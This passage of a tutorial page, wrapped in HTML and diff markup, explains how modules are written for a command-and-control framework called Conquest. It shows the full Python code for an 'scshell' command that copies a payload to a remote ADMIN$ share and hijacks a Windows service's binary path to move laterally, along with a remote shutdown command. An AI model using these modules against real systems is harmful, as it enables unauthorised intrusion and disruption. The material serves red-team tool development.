+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    bof = conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
+</span></span><span style="display:flex;"><span>    params = conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zzzb&#34;</span>, [
+</span></span><span style="display:flex;"><span>        target,         <span style="color:#007f7f"># z: Target system</span>
+</span></span><span style="display:flex;"><span>        service,        <span style="color:#007f7f"># z: Target service</span>
+</span></span><span style="display:flex;"><span>        path,           <span style="color:#007f7f"># z: Payload path</span>
+</span></span><span style="display:flex;"><span>        payloadBytes,   <span style="color:#007f7f"># b: Payload bytes         </span>
+</span></span><span style="display:flex;"><span>    ])
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, the <code>bof</code> command is executed as an alias with the hex string as the argument.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof):
+</span></span><span style="display:flex;"><span>        conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The handler function is assigned to the command using <code>setHandler</code>.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span> .setHandler(_scshell)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unless the handler function of a BOF is highly complex, it is recommended to define the handler as an inline lambda function, as shown for the <code>shutdown</code> command below, as this keeps the module code more concise and clean. Note that the <code>:=</code> is used to assign variables in this case.</p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="Shutdown BOF entry point" src=" /img/c2-module-system/4.png">
+    </div>
+    
+</figure>
+
+
+
+
+
+    
+
+
+<div class="color-block content-margin color-block-caption">
+
+    
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline>
+</svg>
+
+
+
+    <div class="color-block-content">
+        Entry point of the <code>shutdown</code> BOF.
+    </div>
+</div>
+</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>cmd_shutdown = ( 
+</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;shutdown&#34;</span>, description=<span style="color:#0ff;font-weight:bold">&#34;Shutdown or reboot a target system.&#34;</span>, example=<span style="color:#0ff;font-weight:bold">&#34;shutdown --message </span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">Goodbye from Conquest</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold"> --in 20 --reboot&#34;</span>,
+</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to shutdown a computer.&#34;</span>, mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1529&#34;</span>])
+</span></span><span style="display:flex;"><span>            .addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system (default: local computer).&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Message to display before shutdown (default: none).&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagInt(<span style="color:#0ff;font-weight:bold">&#34;--in&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;seconds&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Number of seconds before shutdown/reboot (default: 0).&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--close-apps&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;close-apps&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Close all running applications without saving.&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--reboot&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;reboot&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Reboot system after shutdown.&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--confirm&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;confirm&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Confirm shutdown. This flag acts as a safety net to prevent unwanted shutdowns/reboots&#34;</span>)
+</span></span><span style="display:flex;"><span>            .setHandler(<span style="color:#fff;font-weight:bold">lambda</span> agentId, cmdline, args: (
+</span></span><span style="display:flex;"><span>                target := conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>),
+</span></span><span style="display:flex;"><span>                message := conquest.get_string(args, <span style="color:#ff0;font-weight:bold">1</span>),
+</span></span><span style="display:flex;"><span>                seconds := conquest.get_int(args, <span style="color:#ff0;font-weight:bold">2</span>),
+</span></span><span style="display:flex;"><span>                closeApps := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">3</span>),
+</span></span><span style="display:flex;"><span>                reboot := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">4</span>),
+</span></span><span style="display:flex;"><span>                confirm := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">5</span>),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">&#34;Set the --confirm flag to shutdown the target system.&#34;</span>) <span style="color:#fff;font-weight:bold">if</span> not confirm
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">else</span> (
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    bof := conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/remote-operations/CS-Remote-OPs-BOF/Remote/shutdown/shutdown.x64.o&#34;</span>,
+</span></span><span style="display:flex;"><span>                    params := conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zziss&#34;</span>, [
+</span></span><span style="display:flex;"><span>                        target,                 <span style="color:#007f7f"># z: Target system</span>
+</span></span><span style="display:flex;"><span>                        message,                <span style="color:#007f7f"># z: Shutdown message</span>
+</span></span><span style="display:flex;"><span>                        seconds,                <span style="color:#007f7f"># i: Seconds until shutdown</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">int</span>(closeApps),         <span style="color:#007f7f"># s: Close apps without saving</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">int</span>(reboot)             <span style="color:#007f7f"># s: Reboot after shutdown</span>
+</span></span><span style="display:flex;"><span>                    ]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>) <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof)
+</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">else</span> conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            ))
+</span></span><span style="display:flex;"><span>).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;remote operations&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="command-registration" class="header-anchor-wrapper">Command Registration
+  <a href="#command-registration" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>In order to be able to actually use the defined command, it needs to be added to a command group using the <code>registerToGroup</code> API. If the group name passed to the function does not exist, a new group with that name will be created.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span> ).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;lateral movement&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Overall, the full <code>scshell.py</code> module looks as follows.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> conquest 
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> os.path 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> _scshell(agentId, cmdline, args): 
+</span></span><span style="display:flex;"><span>    target = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>)
+</span></span><span style="display:flex;"><span>    payloadName, payloadBytes = conquest.get_file(args, <span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span>    service = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">2</span>)
+</span></span><span style="display:flex;"><span>    name = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">3</span>)
+</span></span><span style="display:flex;"><span>    share = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># Format path</span>
+</span></span><span style="display:flex;"><span>    path = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\\\</span><span style="color:#0ff;font-weight:bold">{</span>target<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>share<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>name <span style="color:#fff;font-weight:bold">if</span> name <span style="color:#fff;font-weight:bold">else</span> service<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> not path.endswith(<span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>): path += <span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bof = conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/lateral-movement/scshell/scshell.x64.o&#34;</span>
+</span></span><span style="display:flex;"><span>    params = conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zzzb&#34;</span>, [
+</span></span><span style="display:flex;"><span>        target,         <span style="color:#007f7f"># z: Target system</span>
+</span></span><span style="display:flex;"><span>        service,        <span style="color:#007f7f"># z: Target service</span>
+</span></span><span style="display:flex;"><span>        path,           <span style="color:#007f7f"># z: Payload path</span>
+</span></span><span style="display:flex;"><span>        payloadBytes,   <span style="color:#007f7f"># b: Payload bytes         </span>
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof):
+</span></span><span style="display:flex;"><span>        conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cmd_scshell = (
+</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;scshell&#34;</span>, description=<span style="color:#0ff;font-weight:bold">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span>, example=<span style="color:#0ff;font-weight:bold">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span>,
+</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span>, mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1021.002&#34;</span>])
+</span></span><span style="display:flex;"><span>            .addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system hostname or IP address.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
+</span></span><span style="display:flex;"><span>            .addArgFile(<span style="color:#0ff;font-weight:bold">&#34;payload&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Path to payload to execute on the target.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
+</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service (default: defragsvc).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;defragsvc&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service name (default: Name of the target service).&#34;</span>)
+</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Share for copying payload (default: ADMIN$).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;ADMIN$&#34;</span>)
+</span></span><span style="display:flex;"><span>            .setHandler(_scshell)            
+</span></span><span style="display:flex;"><span>).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;lateral movement&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It creates the <code>scshell</code> command in Conquest that can be used to move laterally to other systems via SMB.</p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="SCShell help" src=" /img/c2-module-system/5.png">
+    </div>
+    
+</figure></p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="SCShell command execution" src=" /img/c2-module-system/6.png">
+    </div>
+    
